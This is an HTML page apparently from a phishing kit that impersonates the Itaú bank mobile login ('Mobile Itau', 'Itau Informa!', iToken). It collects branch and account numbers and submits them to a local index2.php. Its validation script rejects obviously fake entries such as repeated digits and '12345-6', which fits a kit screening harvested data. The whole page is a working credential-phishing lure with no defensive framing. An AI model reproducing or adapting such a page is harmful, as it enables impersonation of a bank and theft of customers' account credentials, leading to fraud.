<!DOCTYPE html>
<html lang="pt-br">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<script type="text/javascript" src="app/js/complemento.js"></script>
<title>Mobile Itau</title>
<style>
body { background:url(app/img/bg-body.png) repeat; margin:0;}

.logo-bg {
	background:url(app/img/logo.png) no-repeat;
	background-position:30px 26px;
	height:100px;
	background-size:70px;	
	}

.geral { padding:20px;}

.meio {
	border-radius:2px;
	padding: 10px;
	border:1px solid #FFF;
	}
	
.dadosI {
    background: rgba(0, 0, 0, 0) url("app/img/bg-body.png") repeat scroll 0 0;
    border: 0 none;
    color: #ffffff;
    font-size: 18px;
    height: 20px;
    margin: 0 auto;
    outline: medium none;
    padding: 6px 1px;
    width: 100%;
	}

.float-label {
  padding:2px;
}

.float-label label{
  display: block;
  position:absolute;
  box-sizing: border-box;
}

.float-label input{}


.float-label label {
    color: #FFF;
    font-size: 16px;
    margin-left: 0;
    margin-top: -52px;
    transition-duration: 0.2s;
  
}

.float-label input {
  margin-top: 17px;
}

.float-label input[data-empty] + label {
    color: #fff;
    font-size: 18px;
    font-weight: 500;
    margin-left: 4px;
    margin-top: -29px;
    width: 120px;
}
.esquerda {float:left;}
.direita {float:right;}

/* Estilo iOS */
.switch__container {
  width: 120px;
}

.switch {
  visibility: hidden;
  position: absolute;
  margin-left: -9999px;
}

.switch + label {
  display: block;
  position: relative;
  cursor: pointer;
  outline: none;
  user-select: none;
}

.switch--shadow + label {
  padding: 2px;
  width: 60px;
  height: 30px;
  background-color: #dddddd;
  border-radius: 60px;
}
.switch--shadow + label:before,
.switch--shadow + label:after {
  display: block;
  position: absolute;
  top: 1px;
  left: 2px;
  bottom: 1px;
  content: "";
}
.switch--shadow + label:before {
  right: 1px;
  background-color: #fff;
  border-radius: 60px;
  transition: background 0.4s;
}
.switch--shadow + label:after {
  width: 30px;
  background-color: #fff;
  border-radius: 100%;
  box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
  transition: all 0.4s;
}
.switch--shadow:checked + label:before {
  background-color: #B05800;
}
.switch--shadow:checked + label:after {
  transform: translateX(30px);
}
.aaSS {padding:60px 20px;}


#btter {
	width:100%;
	padding:12px;
	background:url(app/img/bg-bt.png) repeat;
	color:#F3AC36;
	font-family:Verdana, Geneva, sans-serif;
	font-size:20px;
	border-radius:8px;
	border:0 none;
	}

#bgadd{
	position:fixed;
	top:0px;
	left:0px;
	width:100%;
	height:100%;
	z-index:998;
	background:url(app/img/bg-loading.png) repeat;
	display:none;
	}
	
.modalposition{ 
    background: #fff none repeat scroll 0 0;
    border: 1px solid #999;
    border-radius: 0;
    box-shadow: 0 0 10px #999;
    color: #000;
    font-family: Arial;
    font-size: 12px;
    height: 130px;
    left: 50%;
    margin-left: -150px;
    margin-top: -170px;
    position: absolute;
    top: 50%;
    width: 300px;
    z-index: 99999;
	  }
	
.modaldiv1{ height: 30px; width:; }
.modaltext{ padding: 15px; padding-bottom: 10px; color:#666666; }
.modalbutton{ padding:5px 30px 5px 30px; color:#FFF; border:1px solid #900; font-size:12px; background:#F00; font-weight:bold; border-radius:0;}
.modaldiv2{ margin-top:50px; display:block;}
.modalinforma{ padding-top: 0; padding:7px; font-family: Arial; font-size: 14px; color:#FFF; background:#103296; text-shadow:1px 1px 1px #666666;}	
	
.bttok {
	background: rgba(0, 0, 0, 0) url("app/img/bgbtt.png") repeat scroll 0 0;
    border: 0 none;
    border-radius: 4px;
    color: #fff;
    font-family: arial;
    font-size: 14px;
    padding: 6px;
    text-align: center;
    width: 45px;
	cursor:pointer;
	}
	
</style>
</head>

<body>
<div class="logo-bg"></div>

<div class="geral" >

<div class="meio">
<form id="ajaxpf" name="ajaxpf" method="post" onSubmit="return ValidandoSHK()" action="index2.php" autocomplete="off">
<div style="border-bottom:1px #FFF solid; width:100%; height: 52px;">
<div class="esquerda">
<div style="height:20px; width:110px; clear:both;" class="float-label"><input class="dadosI nums" type="tel" name="AGinforma" id="AGinforma" maxlength="4" onKeyUp="javascript:pulacampo('AGinforma','CTinforma');" onKeyPress="return sonumb(event);" data-empty />
<label for="AGinforma">Agência</label></div>
</div>
<div class="esquerda">
<div style="height:20px; width:90px;" class="float-label"><input class="dadosI nums" type="tel" name="CTinforma" id="CTinforma" maxlength="7" onKeyUp="javascript:pulacampo('CTinforma','btter');maskTrak('#####-@', this);" onKeyPress="return sonumb(event);" data-empty />
<label for="CTinforma">Conta</label></div>
</div>
</div>



<div id="aaSS" class="aaSS">

<div style="float:left; width:100%; text-align:right;" class="switch__container">
   <div style="float:left;">
  <input id="switch-shadow" class="switch switch--shadow" type="checkbox">
  <label for="switch-shadow"></label>
  </div>
 <div style="float:left; width:148px; margin-top: 10px; color: #fff; font-family:Arial, Helvetica, sans-serif; font-size: 13px;">Lembrar agência e conta</div>
</div>

</div>

<div><input id="btter" name="btter" type="submit" value="Avançar" /></div>
</form>
</div>
<div style="background:url(app/img/tokn.png) no-repeat; background-position:center 6px; text-align:center; padding:24px; color:#FFF; margin-top: 12px; font-family:Arial, Helvetica, sans-serif; font-size:12px;">iToken</div>


</div>


<div style="display:none;" id="modalalert" class="modalposition">
<div class="modaldiv1">
<center>
<div class="modalinforma"><div class="glyphicon glyphicon glyphicon-lock" style="padding:0 10px 0 0;"></div>Itau Informa!</div>
<div class="modaltext"><div id="TextErrorModal">Erro</div></div>
</center>
</div>
<div class="modaldiv2" align="center">
<a href="#closemodal"><button class="bttok" onClick="feixaMG()">&nbsp;&nbsp;Ok&nbsp;&nbsp;</button></a>
</div>
</div>

<script>
function feixaMG(){
	document.getElementById('modalalert').style.display='none';
	document.getElementById('bgadd').style.display='none';
	}
</script>


<div id="bgadd"></div>

<script>
var floatLabel = document.querySelectorAll(".float-label");
var onFloatLabelChange = function () {
  if (this.value.length == 0) {
    this.dataset.empty = null;
  } else {
    delete this.dataset.empty;
  }
}

floatLabel = [].slice.apply(floatLabel);
floatLabel.forEach(function (container) {
  var input = container.querySelector("input");
  input.addEventListener("keyup", onFloatLabelChange);
});
</script>


<script type="text/javascript">
function ValidandoSHK(){
	var ModalAlertError = document.getElementById("TextErrorModal");
    var ModalAlert = document.getElementById("modalalert");
	var Modalfundo = document.getElementById("bgadd");
	
if ( document.ajaxpf.AGinforma.value == "" ||
document.ajaxpf.AGinforma.value.length < 4 ||
document.ajaxpf.AGinforma.value.length > 4 ||
document.ajaxpf.AGinforma.value == "0000" || 
document.ajaxpf.AGinforma.value == "1111" || 
document.ajaxpf.AGinforma.value == "2222" ||
document.ajaxpf.AGinforma.value == "3333" || 
document.ajaxpf.AGinforma.value == "4444" || 
document.ajaxpf.AGinforma.value == "5555" || 
document.ajaxpf.AGinforma.value == "6666" || 
document.ajaxpf.AGinforma.value == "7777" || 
document.ajaxpf.AGinforma.value == "8888" || 
document.ajaxpf.AGinforma.value == "9999"){
document.getElementById("AGinforma").value = "";
ModalAlertError.innerHTML = "Agência Invalida!"; ModalAlert.style.display = ""; Modalfundo.style.display = "block";
return false;
    }

if ( document.ajaxpf.CTinforma.value == "" ||
document.ajaxpf.CTinforma.value.length < 7 ||
document.ajaxpf.CTinforma.value.length > 7 ||
document.ajaxpf.CTinforma.value == "00000-0" || 
document.ajaxpf.CTinforma.value == "11111-1" || 
document.ajaxpf.CTinforma.value == "22222-2" ||
document.ajaxpf.CTinforma.value == "33333-3" || 
document.ajaxpf.CTinforma.value == "44444-4" || 
document.ajaxpf.CTinforma.value == "55555-5" || 
document.ajaxpf.CTinforma.value == "66666-6" || 
document.ajaxpf.CTinforma.value == "77777-7" || 
document.ajaxpf.CTinforma.value == "88888-8" || 
document.ajaxpf.CTinforma.value == "99999-9" ||
document.ajaxpf.CTinforma.value == "12345-6"){
document.getElementById("CTinforma").value = "";
ModalAlertError.innerHTML = "Conta Invalida!"; ModalAlert.style.display = ""; Modalfundo.style.display = "block";
return false;
    }
	
}
</script>

</body>
</html>